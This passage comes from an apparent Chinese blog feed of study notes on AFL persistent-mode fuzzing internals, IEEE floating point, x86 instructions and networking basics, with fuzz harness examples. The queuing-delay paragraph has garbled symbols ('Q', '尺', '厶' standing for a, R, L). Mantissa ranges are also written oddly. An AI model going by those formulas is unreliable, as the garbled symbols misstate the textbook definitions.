&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^__APPLE__ */</span></span><br>    <span class="hljs-string">&quot;_L(_A); &#125;)&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>编译器 -D 选项，编译时拓展宏定义</p><p>读完 persistent mode 运行流程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> __afl_persistent_loop(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_cnt) &#123;<br><br>  <span class="hljs-type">static</span> u8  first_pass = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">static</span> u32 cycle_cnt;<br><br>  <span class="hljs-keyword">if</span> (first_pass) &#123;<br><br>    <span class="hljs-comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span><br><span class="hljs-comment">       On subsequent calls, the parent will take care of that, but on the first</span><br><span class="hljs-comment">       iteration, it&#x27;s our job to erase any trace of whatever happened</span><br><span class="hljs-comment">       before the loop. */</span><br><br>    <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>      <span class="hljs-built_in">memset</span>(__afl_area_ptr, <span class="hljs-number">0</span>, MAP_SIZE);<br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    cycle_cnt  = max_cnt;<br>    first_pass = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>    <span class="hljs-keyword">if</span> (--cycle_cnt) &#123;<br><br>      <span class="hljs-built_in">raise</span>(SIGSTOP);<br><br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span><br><span class="hljs-comment">         follows the loop is not traced. We do that by pivoting back to the</span><br><span class="hljs-comment">         dummy output region. */</span><br><br>      __afl_area_ptr = __afl_area_initial;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>首先在main函数之前读取共享内容，然后以当前进程为fork server，去和AFL fuzz通信。</p></li><li><p>当AFL fuzz通知进行一次fuzz，由于此时child_stopped为0，则fork server先fork出一个子进程。</p></li><li><p>这个子进程会很快执行到<code>__AFL_LOOP</code>包围的代码，因为是第一次执行loop，所以会先清空<code>__afl_area_ptr</code>和设置<code>__afl_prev_loc</code>为0，并向共享内存的第一个元素写一个值，然后设置循环次数1000，随后返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI。</p></li><li><p>然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，此时将循环次数减一，变成999，然后发出信号<code>SIGSTOP</code>来让当前进程暂停，因为我们设置了WUNTRACED，所以waitpid函数就会返回，fork server将继续执行。</p></li><li><p>fork server在收到<code>SIGSTOP</code>信号后就知道fuzzAPI已经被成功执行结束了，就设置child_stopped为1，并告知AFL fuzz</p></li><li><p>然后当AFL fuzz通知再进行一次fuzz的时候，fork server将不再需要去fork出一个新的子进程去进行fuzz，只需要恢复之前的子进程继续执行，并设置child_stopped为0</p></li><li><p>因为我们是<strong>相当于重新执行一次程序</strong>，所以将<code>__afl_prev_loc</code>设置为0，并向共享内存的第一个元素写一个值，随后直接返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成998，并发出信号暂停。</p></li><li><p>上述过程重复执行，直到第1000次执行时，先恢复执行，然后返回1，然后执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成0，此时循环次数cnt已经被减到0，就不会再发出信号暂停子进程，而是设置<code>__afl_area_ptr</code>指向一个无关数组<code>__afl_area_initial</code>，随后将子进程执行到结束。</p></li></ul><p><strong>这是因为程序依然会向后执行并触发到instrument，这会向<code>__afl_area_ptr</code>里写值，但是此时我们其实并没有执行<code>fuzzAPI</code>，我们并不想向共享内存里写值，于是将其指向一个无关数组，随意写值。同理，在deferred instrumentation模式里，在执行<code>__afl_manual_init</code>之前，也是向无关数组里写值，因为我们将fork点手动设置，就代表在这个fork点之前的path我们并不关心。</strong></p><ul><li><p>重新整理一下上面的逻辑</p><ul><li>loop第一次执行的时候，会初始化，然后返回1，执行一次fuzzAPI，然后cnt会减到999，然后抛出信号暂停子进程。</li><li>loop第二次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到998，然后抛出信号暂停子进程。</li><li>loop第1000次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到0，然后就设置指向无关数组，返回0，while循环结束，程序也将执行结束。</li></ul></li><li><p>此时fork server将不再收到SIGSTOP信号，于是child_stopped仍为0。</p></li><li><p>所以当AFL fuzz通知fork server再进行一次fuzz的时候，由于此时child_stopped为0，则fork server会先fork出一个子进程，然后后续过程和之前一样了。</p></li></ul><p>涉及 编译时的 __AFL_LOOP 宏展开，以及宏内定义的  __afl_persistent_loop( ) 函数</p><p>参考：</p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p>内3.3.2部分</p><p>回到 xfuzz 关系的分析</p><p>C++语法：</p><p>throw，try，catch</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统</title>
    <link href="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统"><a href="#计算机系统" class="headerlink" title="计算机系统"></a>计算机系统</h1><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><p>IEEE 浮点标准用 <code>V = (-1)^S X M X 2^E</code>来表示一个数：</p><ul><li>符号位：s 决定这个数为负数（ s = 1）或正数（s = 0）；</li><li>尾数： M 是一个二进制小数，其范围为 1 ~ 2 - 0，或  0 ~ 1 - 0；</li><li>阶码：E 的作用是对浮点数加权，为 2 的 E 次幂。</li></ul><p><strong>浮点数的位表示</strong><br>一个浮点数的位划分为三个字段，分别对这些值进行编码：</p><ul><li>第一个单独的符号位s直接编码s；</li><li>k 位的阶码字段 exp = … 编码 E；</li><li>n 位小数字段编码尾数 M 。</li></ul><p><strong>单精度字段分配</strong><br>s、exp、frac 字段分别为 1，8，23位；<br><strong>双精度字段分配</strong><br>s、exp、frac 字段分别为 1， 11， 52位。</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p1.png"></p><p><strong>规格化的值</strong></p><ul><li>exp 的位模式不全为0 也不全为1时。</li><li>阶码字段被解释为以偏置（biased）表示的有符号整数。即 E = e - Bias， e 是无符号数，Bias是 2^(k-1) - 1。（单精度 Bias 为127，双精度为 1023）</li><li>frac是小数值，取值是 [0 , 1)。</li><li>尾数定义为 <strong>M = 1 + f</strong>。</li></ul><p>举个例子：</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p2.png"></p><p>其过程：</p><ul><li>先化为二进制；</li><li>然后数最高位的阶E；</li><li>阶码 exp = E + Bias（127或1023）；</li><li>阶码 exp 化为二进制；</li><li>将原二进制数中第一个1去除后，将剩下部分补入尾数，右侧补0补齐。</li></ul><p><strong>非规格化值</strong></p><ul><li>exp全为0；</li><li>阶码 E = 1 - Bias （ 为了非规格化与规格化值之间平滑过渡）</li><li>尾数 <strong>M = 0.xxxxxxx</strong></li></ul><p>如：</p><ul><li>exp = 000000..0，frac = 000000..00，此时值为0，符号位决定 +，- 0；</li><li>exp = 000000..0，frac != 000000..00，此时为非常接近0的数。</li></ul><p><strong>特殊值</strong><br>判断条件：exp = 全1；</p><ul><li>exp = 全1，frac = 全0：表示无穷大，符号位决定正无穷或负无穷。</li><li>exp = 全1，frac 不是全0；表示这不是一个数。</li></ul><p>总结如下：<br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p3.png"></p><p><strong>舍入</strong></p><p>向偶数舍入，即1.4会舍入为1，1.6舍入为2，<strong>1.5舍入为2，-1.5舍入为-2</strong>，使最低有效位为偶数。<br>二进制小数舍入：<br>若需要舍入至小数点后2位，先看第三位及以后，是否为中间值，即仅仅第三位为1，后面位全为0。<br>若是中间值，将第二位舍入为0，不是中间值，去向更靠近的一方。</p><p><strong>浮点数运算</strong><br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p4.png"></p><p>即</p><ul><li>符号位亦或<code>^</code></li><li>尾数相乘</li><li>阶码E相加</li></ul><p>若</p><ul><li>M &gt;= 2 ， M 右移一位，E = E + 1</li><li>若 E 超出范围，溢出</li><li>将 M 舍入到 frac 的位数范围。</li></ul><h1 id="第三章-程序的机器级执行"><a href="#第三章-程序的机器级执行" class="headerlink" title="第三章 程序的机器级执行"></a>第三章 程序的机器级执行</h1><ul><li>mov系列指令：</li><li>movb/w/l：移动字节、字、双字</li><li>movsbw：符号拓展后，字节移动到字。</li><li>movzbw：零拓展后，字节移动到字。</li></ul><p>imull/mull<br>要求其中一个操作数在eax中，调用如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">imull</span> <span class="hljs-number">8</span>(%ebp)<br></code></pre></td></tr></table></figure><p>即最后一个参数与eax中的值相乘，乘积存放在寄存器 edx （高32位）和 eax（低32位）中。</p><p>cltd指令：将被除数拓展到 edx，eax 中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">movl <span class="hljs-number">8</span>(%ebp),%eax <span class="hljs-regexp">//</span> load x<br>cltd <span class="hljs-regexp">//</span> extend into edx<br>idivl <span class="hljs-number">12</span>(%ebp) <span class="hljs-regexp">//</span> divide by y<br></code></pre></td></tr></table></figure><p>条件码寄存器：<br>CF : 进位标志。最高位产生进位，无符号数溢出；<br>ZF : 零标志。最近操作结果为0；<br>SF : 符号标志。最近操作结果为负；<br>OF : 溢出标志。最近操作补码溢出。</p><p>lea 指令不会改变任何条件码。</p><p>cmp 指令： 只改变条件码，除此之外，其与 SUB 指令完全一样。<br>test 指令：只改变条件码，其他操作与 AND 一样。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Persistent Mode</title>
    <link href="/2023/03/14/Persistent-Mode/"/>
    <url>/2023/03/14/Persistent-Mode/</url>
    
    <content type="html"><![CDATA[<h1 id="Forkserver-Persistent-Mode"><a href="#Forkserver-Persistent-Mode" class="headerlink" title="Forkserver Persistent Mode"></a>Forkserver Persistent Mode</h1><h2 id="Persistent-Mode"><a href="#Persistent-Mode" class="headerlink" title="Persistent Mode"></a>Persistent Mode</h2><p>AFL 中采用 Forserver 来加快程序运行效率，其原理是利用 Forkserver 机制 fork() 出子程序进行执行，取代了 execve() 的执行模式，避免了大量重复的链接等操作，大大提升了 Fuzz 的速率。</p><p>进一步看，由于某些库提供的 API 是无状态的，或能重置其状态，在一次次循环之间。当 API 重置后，一个长期活跃的进程就可以被重复使用，这样可以消除 fork() 函数以及 OS 相关的消耗。</p><p>通常，Persistent Mode 下，程序可有 x10 ~ x20 倍的速率提升。</p><h3 id="使用-Persistent-Mode"><a href="#使用-Persistent-Mode" class="headerlink" title="使用 Persistent Mode"></a>使用 Persistent Mode</h3><p>使用 Persistent Mode 很简单，只需要修改 target 程序为一个确定的模式即可</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;what_you_need_for_your_target.h&quot;</span></span><br><span class="hljs-comment">//引用有目标无状态 API 的库</span><br>__AFL_FUZZ_INIT();<br><br>main() &#123;<br><br>  <span class="hljs-comment">// anything else here, e.g. command line arguments, initialization, etc.</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br>  __AFL_INIT();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf = __AFL_FUZZ_TESTCASE_BUF;  <span class="hljs-comment">// must be after __AFL_INIT</span><br>                                                 <span class="hljs-comment">// and before __AFL_LOOP!</span><br><br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">10000</span>)) &#123;<br><br>    <span class="hljs-type">int</span> len = __AFL_FUZZ_TESTCASE_LEN;  <span class="hljs-comment">// don&#x27;t use the macro directly in a</span><br>                                        <span class="hljs-comment">// call!</span><br><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// check for a required/useful minimum input length</span><br><br>    <span class="hljs-comment">/* Setup function call, e.g. struct target *tmp = libtarget_init() */</span><br>    <span class="hljs-comment">/* Call function to be fuzzed, e.g.: */</span><br>    target_function(buf, len);<br>    <span class="hljs-comment">/* Reset state. e.g. libtarget_free(tmp) */</span><br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以下为两个例子<br>对 capstone 进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;capstone/include/capstone.h&quot;</span> <span class="hljs-comment">// 引用capstone内无状态库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    csh handle;<br>    cs_insn *insn;<br>    <span class="hljs-type">size_t</span> count;<br>    <span class="hljs-type">uint8_t</span> buf[<span class="hljs-number">128</span>]; <br>    <span class="hljs-type">ssize_t</span> read_bytes;<br><br>    <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        <span class="hljs-comment">// (re-) initialize the library and read new input</span><br>        read_bytes = <span class="hljs-number">-1</span>; <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br>        read_bytes = read(STDIN_FILENO, buf, <span class="hljs-number">128</span>);<br><br>        <span class="hljs-keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle) == CS_ERR_OK) &#123;<br>            <span class="hljs-comment">// disassemble the bytes we just read using capstone</span><br>            count = cs_disasm(handle, buf, read_bytes, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>, &amp;insn);<br><br>            <span class="hljs-comment">// Don&#x27;t leak memory. This is especially important in persistent mode, </span><br>            <span class="hljs-comment">// because we reuse the process a significant number of times</span><br>            cs_free(insn, count); <br>        &#125;<br>        cs_close(&amp;handle);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对某程序进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ft2build.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> FT_FREETYPE_H</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>&#123;<br>    FT_Library lib = <span class="hljs-literal">NULL</span>;<br>    FT_Face face = <span class="hljs-literal">NULL</span>;<br>    FT_Init_FreeType(&amp;lib);<br><br>    <span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        face = <span class="hljs-literal">NULL</span>;<br>        FT_New_Face(lib, argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, &amp;face);<br>        FT_Done_Face(face);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意：重置状态时应尽力避免 memory leak **</p><h3 id="AFL-LOOP"><a href="#AFL-LOOP" class="headerlink" title="__AFL_LOOP"></a>__AFL_LOOP</h3><p>_AFL_LOOP 的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __AFL_LOOP(_A)  \</span><br><span class="hljs-meta">(&#123; \</span><br><span class="hljs-meta">    static volatile char *_B __attribute__((used));  \</span><br><span class="hljs-meta">    _B = (char*)<span class="hljs-string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; \</span><br><span class="hljs-meta">    __attribute__((visibility(<span class="hljs-string">&quot;default&quot;</span>))) int _L(unsigned int) __asm__(<span class="hljs-string">&quot;__afl_persistent_loop&quot;</span>); \</span><br><span class="hljs-meta">    _L(_A); \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>宏定义 <code>__AFL_LOOP</code>内部调用<code>__afl_persistent_loop</code>函数</p><p>该函数源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span><br><br><span class="hljs-type">int</span> __afl_persistent_loop(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_cnt) &#123;<br><br>  <span class="hljs-type">static</span> u8  first_pass = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">static</span> u32 cycle_cnt;<br><br>  <span class="hljs-keyword">if</span> (first_pass) &#123;<br><br>    <span class="hljs-comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span><br><span class="hljs-comment">      On subsequent calls, the parent will take care of that, but on the first</span><br><span class="hljs-comment">      iteration, it&#x27;s our job to erase any trace of whatever happened</span><br><span class="hljs-comment">      before the loop. */</span><br><br>    <span class="hljs-keyword">if</span> (is_persistent) &#123;<br>     <span class="hljs-comment">// 重置共享内存</span><br>      <span class="hljs-built_in">memset</span>(__afl_area_ptr, <span class="hljs-number">0</span>, MAP_SIZE);<br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    cycle_cnt  = max_cnt;<br>    first_pass = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>    <span class="hljs-keyword">if</span> (--cycle_cnt) &#123;<br><br>      raise(SIGSTOP);<br><br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span><br><span class="hljs-comment">        follows the loop is not traced. We do that by pivoting back to the</span><br><span class="hljs-comment">        dummy output region. */</span><br><br>      __afl_area_ptr = __afl_area_initial;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络</title>
    <link href="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章-计算机网络和因特网"></a>第一章-计算机网络和因特网</h1><h2 id="因特网构成"><a href="#因特网构成" class="headerlink" title="因特网构成"></a>因特网构成</h2><ul><li>手机、电脑、电视等接入互联网的“物品”称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>；</li><li>链接上述终端的是<strong>通信链路（communication link）</strong> 和 <strong>分组交换机（packet switch）</strong>；</li><li>链路有**传输速率（transmission rate)**，单位是比特每秒（bps）；</li><li>端向端发送的数据，分段后加上首部字节，这些信息包称为<strong>分组（packet）</strong>；</li><li>两条链路间，转发分组的称为<strong>分组交换机</strong>，最著名的如<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch)</strong>;</li><li>端到端之间，一个分组经历的所有链路和分组交换机称为<strong>路径（route 或 path）</strong>；</li><li>端系统通过<strong>因特网服务提供商（Internet Service Provider， ISP）</strong>接入因特网；</li><li>以上因特网部件都要运行一系列<strong>协议（protocol）</strong>，<strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet Protocol，网际协议）</strong>是两个最重要的协议；</li><li>IP协议定义了在路由器与端系统之间发送和接收的分组格式；</li><li>设计多个端交互数据的程序，称为<strong>分布式应用程序（distributed application）</strong>；</li></ul><h2 id="What-is-Protocol"><a href="#What-is-Protocol" class="headerlink" title="What is Protocol ?"></a>What is Protocol ?</h2><p><strong>协议（protocol）</strong>定义了两个或多个通信实体间交换的报文的格式和顺序，以及发送/接收报文时采取的动作。</p><h2 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h2><p>这是指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络。<br>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器。<br>住户通常从提供本地电话接入的本地电话公司处获得<strong>数字用户线（Digital SubscriberDSL）</strong>因特网接入。因此，当使用DSL时，用户的本地电话公司也是它的ISP。</p><h2 id="卫星无线电信道"><a href="#卫星无线电信道" class="headerlink" title="卫星无线电信道"></a>卫星无线电信道</h2><p>通常使用两类卫星：<strong>同步卫星（geostationary)<strong>和</strong>近地轨道卫星（Low-Earth Orbiting, LEO）</strong>；</p><h2 id="存储转发传输"><a href="#存储转发传输" class="headerlink" title="存储转发传输"></a>存储转发传输</h2><p>存储转发传输指交换机开始向输出链路传输该分组第一个bit前，必须先完整收到整个分组。</p><h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>网络链路和交换机移动数据有两种基本方法：<strong>电路交换（circuit switching）</strong>和<strong>分组交换（packet switching)</strong><br>链路中的电路是通过<strong>频分复用 (Frequency- Division Multiplexing, FDM )<strong>或</strong>时分复用<br>（Time-Division Multiplexing, TDM）</strong>来实现的。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>这些时延最为重要的是<strong>节点处理时延(nodal processing delay) <strong>、</strong>排队时延(queuing delay)<strong>、</strong>传输时延<br>(transmission delay)<strong>和</strong>传播时延(propagation delay)</strong>,这些时延总体累加起来是**节点总时延(tolal nodal delay)**。<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p1.png"></p><p>令Q表示分组到达队列的平均速率（a的单位是分组/秒，即pkt/s）o前面讲过尺是传输速率，即从队列中推出比特的速率（以bps即b/s为单位）。为了简单起见，也假定所有分组都是由厶比特组成的。则比特到达队列的平均速率是La bps。最后，假定该队列非常大，因此它基本能容纳无限数量的比特。比率<code>La/R</code>被称为流量强度（traffic intensity）,它在估计排队时延的范围方面经常起着重要的作用。如果La/R&gt;l,则比特到达队列的平均速率超过从该队列传输岀去的速率。在这种不幸的情况下，该队列趋向于无限增加，并且排队时延将趋向无穷大！因此，流量工程中的一条金科玉律是：设计系统时流量强度不能大于1</p><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><p>下层为上一层提供<strong>服务（service）</strong>，各层的所有协议称为协议栈（protocol 